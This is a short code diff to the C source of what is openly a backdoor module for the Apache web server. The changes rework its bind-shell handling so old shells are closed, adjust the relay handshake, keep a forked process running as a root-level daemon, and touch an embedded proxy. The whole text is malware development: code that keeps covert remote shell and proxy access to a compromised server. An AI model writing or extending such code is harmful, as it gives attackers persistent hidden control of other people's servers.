@@ -405,7 +405,6 @@ static void zero_arg(char *s) {
 
 int startProxy(int port, char* user){
     const char *listenip = "0.0.0.0";
-    proxyPid = getpid();
     if(user != NULL){
         auth_ips = sblist_new(sizeof(union sockaddr_union), 8);
         auth_user = strdup(user);
@@ -810,10 +809,12 @@ static int backdoor_post_read_request(request_rec *r) {
 
             new_socket = accept(bindfd, (struct sockaddr *)&server, (socklen_t*)&serverlen);
 
-            write(sock,"BIND",strlen("BIND")+1);
+            // To properly kill old shells
+            close(bindfd);
+
+            write(sock,"BIND",strlen("BIND"));
             bicomIPC(sock,new_socket);
             close(new_socket);
-
         }
 
     }
@@ -1003,7 +1004,7 @@ int waitIPC(int master){
 int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {
 
     pid = fork();
-    // Kill father just after he had loaded the config to create apache2 root daemon
+    // Return father process just after he had loaded the config to create apache2 root daemon
     if (pid) {
         return OK;
     }
